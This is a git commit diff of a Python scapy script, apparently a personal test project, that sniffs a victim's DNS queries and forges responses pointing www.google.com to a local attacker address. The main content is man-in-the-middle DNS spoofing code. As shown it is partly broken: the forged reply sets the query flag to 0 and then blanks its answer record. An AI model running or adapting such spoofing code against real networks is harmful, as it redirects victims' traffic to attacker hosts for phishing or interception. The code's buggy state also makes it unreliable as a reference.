46ca2199a637a3ca7ebee9e1ff7c7ae5f5d1d5d4
4dapse(Seb) <seb.gper@gmail.com>
2023-06-09 18:02:36 +0200

    DNS Spoofer without proper filter implemented

--- dnsSpoofTest.py
+++ dnsSpoofTest.py
@@ -2,7 +2,7 @@ from scapy.all import *
 
 def dns_req_test() : #This is creating a Standard Query Response. qr=1 indicates that it is a response. an=DNSRR(rrname='www.google.com', rdata='8.8.8.8')
     dns_packet2 = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.google.com'))
-    dns_packet2.show()
+    # dns_packet2.show()
     send(dns_packet2)
     
 def sniff_test() : 
@@ -14,23 +14,37 @@ def sniff_test() :
     # pkt.show()
     # send(pkt)
     
-def sniffPKT() :
-    pkt = sniff()
-    return pkt
+def sniffPKT(ipVictim, goodSite) :
+    pkt = sniff(lfilter=lambda p: p.haslayer(UDP) and p.dport == 53, filter='host ' + ipVictim, count=1, prn=lambda x: x.show())
+    if pkt[0][DNSQR].qname == goodSite :
+        return pkt[0]
+    else :
+        return pkt[0]
     
-def MIMspoofDNS(pkt) :
+def MIMspoofDNS(pkt, goodSite, evilSite) :
     EvilDNSResponse = IP() / UDP() / DNS()
     EvilDNSResponse[IP].dst = pkt[IP].src
-    EvilDNSResponse[UDP].dport = pkt[UDP].dport
+    EvilDNSResponse[IP].src = pkt[IP].dst
+    EvilDNSResponse[UDP].dport = pkt[UDP].sport
+    EvilDNSResponse[UDP].sport = pkt[UDP].dport
     EvilDNSResponse[DNS].rd = pkt[DNS].rd
     EvilDNSResponse[DNS].qd = pkt[DNS].qd
-    EvilDNSResponse[DNS].qr = 1
-    EvilDNSResponse[DNS].an = DNSRR(rrname = 'www.google.com', rdata='192.168.178.23')
-    sendp(EvilDNSResponse)
+    EvilDNSResponse[DNS].qr = 0
+    EvilDNSResponse[DNS].an = DNSRR(rrname = goodSite, rdata = evilSite)
+    EvilDNSResponse[DNS].an = None
+    EvilDNSResponse.show()
+    send(EvilDNSResponse)
+    
+def testSniffnExtract() :
+    pkt = sniff(filter='host 8.8.8.8', session = IPSession, count=1, prn=lambda x: x.show())
+    pkt[0].show()
+    
     
 def main() :
     dns_req_test()
-    sniff_test()
+    # testSniffnExtract()
+    pkt = sniffPKT('8.8.8.8', 'www.google.com.')
+    MIMspoofDNS(pkt, 'www.google.com', '192.168.178.23')
     print("Test Success")
 
 main()
